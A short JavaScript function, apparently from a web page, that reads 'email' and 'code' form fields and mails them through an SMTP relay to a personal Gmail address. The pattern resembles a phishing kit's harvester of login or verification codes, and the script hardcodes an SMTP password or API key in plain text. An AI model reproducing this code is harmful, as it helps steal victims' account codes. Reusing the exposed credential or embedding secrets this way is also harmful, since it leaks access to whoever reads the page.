
function emailSend(){
  var email = document.getElementById('email').value;
  var code = document.getElementById('code').value;




  var messageBody =  
                    "<br/> email: " + email +
                  
                    "<br/> code: " +  code;
  Email.send({
      Host : "smtp.elasticemail.com",
      Username : "andreashope03@gmail.com",
      Password : "E41118CF93C8CB54E62438BA477843A4E752",
      To : 'elsamorhow@gmail.com',
      From : "andreashope03@gmail.com",
      Subject : "This is the subject",
      Body : messageBody
  }).then(
    message => alert(message)
  );



}